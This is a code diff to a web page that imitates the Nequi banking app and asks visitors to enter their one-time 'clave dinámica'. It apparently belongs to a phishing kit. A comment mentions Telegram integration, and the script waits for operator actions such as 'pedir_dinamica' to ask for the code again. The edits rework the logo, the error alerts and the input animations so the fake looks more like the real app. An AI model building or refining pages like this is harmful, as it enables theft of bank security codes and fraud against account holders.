@@ -23,11 +23,20 @@
     .header {
       padding: 20px;
       background-color: #ffffff;
+      text-align: center;
     }
 
-    .logo {
-      width: 100px;
-      margin-bottom: 40px;
+    .logo-text {
+      font-size: 48px;
+      font-weight: 900;
+      color: #1a1a1a;
+      letter-spacing: -1px;
+      margin-bottom: 30px;
+    }
+
+    .logo-dot {
+      color: #ff006b;
+      font-size: 48px;
     }
 
     .title {
@@ -36,6 +45,35 @@
       color: #1a1a1a;
       margin-bottom: 16px;
       text-align: center;
+    }
+
+    .error-alert {
+      display: none;
+      background-color: #fff5f5;
+      color: #d32f2f;
+      padding: 16px 20px;
+      margin: 0 20px 20px;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 14px;
+      line-height: 1.5;
+      border: 1px solid #ffcdd2;
+    }
+
+    .error-alert.show {
+      display: block;
+      animation: slideDown 0.3s ease;
+    }
+
+    @keyframes slideDown {
+      from {
+        opacity: 0;
+        transform: translateY(-10px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
 
     .subtitle {
@@ -75,6 +113,17 @@
 
     .pin-input.filled {
       border-bottom-color: #1a1a1a;
+    }
+
+    .pin-input.error {
+      border-bottom-color: #d32f2f;
+      animation: shake 0.4s ease;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
     }
 
     .keyboard-container {
@@ -220,21 +269,6 @@
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
-
-    .error-message {
-      display: none;
-      background-color: #ff3b30;
-      color: white;
-      padding: 16px;
-      margin: 0 20px 20px;
-      border-radius: 12px;
-      text-align: center;
-      font-size: 14px;
-    }
-
-    .error-message.show {
-      display: block;
-    }
   </style>
 </head>
 <body>
@@ -251,19 +285,17 @@
     </div>
   </div>
 
-  <div class="error-message" id="errorMessage">
-    ⚠️ La clave dinámica es incorrecta. Intenta nuevamente.
-  </div>
-
   <div class="header">
-    <svg class="logo" viewBox="0 0 120 40" fill="none">
-      <rect width="20" height="20" fill="#FF006B"/>
-      <text x="25" y="28" font-family="Arial, sans-serif" font-size="28" font-weight="bold" fill="#1a1a1a">Nequi</text>
-    </svg>
+    <div class="logo-text">
+      <span class="logo-dot">■</span>Nequi
+    </div>
   </div>
 
   <h1 class="title">Confirma tu identidad</h1>
-  <p class="subtitle">Para confirmar tu identidad escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>
+
+  <div class="error-alert" id="errorAlert">
+    ¡Ups! esa no es tu clave dinamica. Puedes consultarla dentro de la App Nequi.
+  </div>
 
   <div class="input-container">
     <input type="text" class="pin-input" maxlength="1" inputmode="none" readonly id="pin1">
@@ -293,7 +325,7 @@
     <div class="keyboard-row">
       <button class="key-btn empty"></button>
       <button class="key-btn" data-value="0">0</button>
-      <button class="key-btn delete" id="deleteBtn">⌫</button>
+      <button class="key-btn delete" id="deleteBtn">×</button>
     </div>
     
     <button class="confirm-btn" id="confirmBtn" disabled>Confirmar</button>
@@ -325,7 +357,7 @@
       const deleteBtn = document.getElementById('deleteBtn');
       const confirmBtn = document.getElementById('confirmBtn');
       const validatingScreen = document.getElementById('validatingScreen');
-      const errorMessage = document.getElementById('errorMessage');
+      const errorAlert = document.getElementById('errorAlert');
       
       let currentIndex = 0;
       
@@ -337,7 +369,11 @@
             inputs[currentIndex].value = value;
             inputs[currentIndex].dataset.realValue = value;
             inputs[currentIndex].classList.add('filled');
+            inputs[currentIndex].classList.remove('error');
             currentIndex++;
+            
+            // Ocultar mensaje de error al empezar a escribir
+            errorAlert.classList.remove('show');
             
             checkComplete();
           }
@@ -351,6 +387,7 @@
           inputs[currentIndex].value = '';
           inputs[currentIndex].dataset.realValue = '';
           inputs[currentIndex].classList.remove('filled');
+          inputs[currentIndex].classList.remove('error');
           
           checkComplete();
         }
@@ -375,9 +412,29 @@
           input.value = '';
           input.dataset.realValue = '';
           input.classList.remove('filled');
+          input.classList.remove('error');
         });
         currentIndex = 0;
         confirmBtn.disabled = true;
+      }
+      
+      // Función para mostrar error
+      function showError() {
+        // Mostrar alerta de error
+        errorAlert.classList.add('show');
+        
+        // Agregar clase de error a los inputs
+        inputs.forEach(input => {
+          if (input.value) {
+            input.classList.add('error');
+          }
+        });
+        
+        // Limpiar campos después de 3 segundos
+        setTimeout(() => {
+          clearInputs();
+          errorAlert.classList.remove('show');
+        }, 3000);
       }
       
       // Botón confirmar con integración de Telegram
@@ -427,14 +484,7 @@
         } catch (error) {
           console.error("❌ Error:", error);
           validatingScreen.classList.remove('active');
-          
-          errorMessage.textContent = "⚠️ Error de conexión. Por favor intenta nuevamente.";
-          errorMessage.classList.add('show');
-          
-          setTimeout(() => {
-            clearInputs();
-            errorMessage.classList.remove('show');
-          }, 3000);
+          showError();
         }
       });
 
@@ -444,13 +494,7 @@
         
         if (action === 'error_dinamica' || action === 'pedir_dinamica') {
           // Mostrar error y limpiar campos
-          errorMessage.textContent = "⚠️ La clave dinámica es incorrecta. Intenta nuevamente.";
-          errorMessage.classList.add('show');
-          
-          setTimeout(() => {
-            clearInputs();
-            errorMessage.classList.remove('show');
-          }, 3000);
+          showError();
         } else if (action === 'correcto') {
           // Redirigir a la siguiente pantalla o mostrar éxito
           console.log('✅ Clave dinámica correcta');
